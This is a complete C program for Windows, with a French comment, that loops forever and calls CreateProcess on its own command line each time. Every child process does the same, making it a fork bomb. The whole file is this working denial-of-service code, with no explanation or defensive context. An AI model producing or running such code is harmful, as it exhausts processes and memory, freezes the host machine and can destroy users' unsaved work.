#include <windows.h>
#include <stdio.h>

int main() {
    while (1) {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        // Recrée le même programme à chaque itération
        if (!CreateProcess(
            NULL,   // No module name (use command line)
            GetCommandLine(), // Command line
            NULL,   // Process handle not inheritable
            NULL,   // Thread handle not inheritable
            FALSE,  // Set handle inheritance to FALSE
            0,      // No creation flags
            NULL,   // Use parent's environment block
            NULL,   // Use parent's starting directory 
            &si,    // Pointer to STARTUPINFO structure
            &pi)    // Pointer to PROCESS_INFORMATION structure
        ) {
            printf("Failed to create process.\n");
        } else {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    return 0;
}
